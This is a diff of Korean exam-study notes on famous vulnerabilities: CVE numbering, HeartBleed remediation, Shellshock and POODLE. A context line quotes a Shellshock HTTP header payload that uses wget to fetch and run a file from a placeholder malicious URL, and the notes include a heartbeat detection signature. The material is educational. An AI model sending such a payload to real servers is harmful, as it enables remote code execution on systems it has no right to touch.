@@ -11,7 +11,9 @@ tags: [HeartBleed, Shellshock, Log4j, POODLE, CVE, OpenSSL]
 
 ## 식별자 — CVE
 
-`CVE-2014-0160` = `CVE` - `발견/공개 연도` - `그 해 일련번호`. MITRE 가 채번하고 NVD 가 CVSS 점수를 부여한다.
+`CVE-2014-0160` = `CVE` - `연도` - `그 해 일련번호`. MITRE 와 CNA(벤더 등)가 채번하고 NVD 가 CVSS 점수를 부여한다.
+
+- 연도는 엄밀히 **ID 가 할당(예약)된 해** — 공개 연도와 다를 수 있다. 4회 기출 답은 "발견 연도"
 
 | 관련 표준 | 의미 |
 |---|---|
@@ -29,6 +31,10 @@ tags: [HeartBleed, Shellshock, Log4j, POODLE, CVE, OpenSSL]
 - 대응: **1.0.1g 이상** 업그레이드 (불가 시 `-DOPENSSL_NO_HEARTBEATS` 재컴파일)
   - **인증서·개인키 재발급** + 사용자 세션·비밀번호 재설정
 - 탐지: `content:"|18 03 00|"` (heartbeat, SSLv3) + 비정상적으로 큰 길이 필드
+
+> [!함정] 패치만으로 끝나지 않는다 {{26-18}}
+> 1.0.1g 업그레이드(시스템 조치) 후에도 이미 새어 나간 개인키·비밀번호는 유효하다.
+> **서버 인증서 재발급 + 사용자 비밀번호 재설정**(서비스 조치)까지 써야 완성 답안이다.
 
 ### Shellshock (Bashdoor) — CVE-2014-6271 {{29-8}}
 
@@ -57,6 +63,10 @@ Accept-Encoding: () { :; }; /bin/bash -c 'wget -O /tmp/x http://악성URL; chmod
 - 협상을 **SSL 3.0 으로 다운그레이드**한 뒤 CBC **패딩 오라클**로 암호문 바이트를 하나씩 복호화
 - 대응: **SSL 3.0 비활성** · `TLS_FALLBACK_SCSV`
 - 관련 CBC 공격: BEAST · Lucky13
+
+> [!함정] HeartBleed 와 헷갈리지 않기 {{15-7}}
+> "SSL 3.0 으로 **낮춰** 암호문 해독" = **POODLE**(프로토콜 다운그레이드).
+> HeartBleed 는 OpenSSL **구현 버그**로 메모리를 읽는 것이며 암호문 해독이 아니다.
 
 ## 기타 유명 취약점 (단답 대비)
 
